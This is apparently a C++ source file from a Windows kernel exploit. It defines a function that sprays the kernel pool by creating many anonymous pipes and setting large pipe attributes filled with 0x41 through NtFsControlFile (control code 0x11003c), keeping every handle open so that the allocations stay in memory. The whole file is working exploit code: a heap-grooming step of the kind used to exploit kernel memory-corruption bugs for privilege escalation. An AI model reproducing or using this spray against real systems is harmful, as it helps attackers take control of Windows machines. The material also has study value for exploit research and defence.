#include "spray.h"
#include "ntos.h"
std::vector<HANDLE> pipeHandles;
IO_STATUS_BLOCK statusBlock;
void sprayPipeAttributes() {
	const ULONG CHUNK_SIZE = 0x79c0;  

	char attribute[] = "attribute_name\00attribute_value";
	char output[0x100] = { 0 };

	for (int i = 0; i < SPRAY_NUM; i++) {
		HANDLE read_pipe = NULL;
		HANDLE write_pipe = NULL;

		BOOL status = CreatePipe((PHANDLE)&read_pipe, (PHANDLE)&write_pipe, NULL, 0x1000);
		if (!status) {
			printf("[-] Failed to create pipe [%d], error: %d\n", i, GetLastError());
			continue;
		}

		printf("[+] [%04d] Pipe created: R=0x%x, W=0x%x\n", i, read_pipe, write_pipe);

		PVOID pipeDataBuffer = _malloc_base(CHUNK_SIZE);
		if (!pipeDataBuffer) {
			printf("[-] Failed to allocate buffer\n");
			CloseHandle(read_pipe);
			CloseHandle(write_pipe);
			continue;
		}

		// Đặt pattern vào chunk: 8 byte header + fill 0x41
		memset((UINT8*)pipeDataBuffer, 0x41, CHUNK_SIZE);
		*(UINT64*)pipeDataBuffer = 0x5a; // Optional header

		void* controlOutBuffer = malloc(0x100);
		if (!controlOutBuffer) {
			printf("[-] Failed to allocate controlOutBuffer\n");
			free(pipeDataBuffer);
			CloseHandle(read_pipe);
			CloseHandle(write_pipe);
			continue;
		}
		memset(controlOutBuffer, 0x42, 0x100);

		NTSTATUS result = _NtFsControlFile(
			write_pipe,
			nullptr,
			nullptr,
			nullptr,
			&statusBlock,
			0x11003c,
			pipeDataBuffer,
			CHUNK_SIZE,
			controlOutBuffer,
			0x100
		);
		//NTSTATUS result = _NtFsControlFile(read_pipe, nullptr, nullptr, nullptr, &statusBlock, 0x11003c, pipeDataBuffer, CHUNK_SIZE, controlOutBuffer, 0x100);

		if (result != 0) {
			printf("[-] NtFsControlFile failed on pipe %d: 0x%X\n", i, result);
		}

		pipeHandles.push_back(read_pipe);
		pipeHandles.push_back(write_pipe);

		free(pipeDataBuffer);
		free(controlOutBuffer);
	}
}
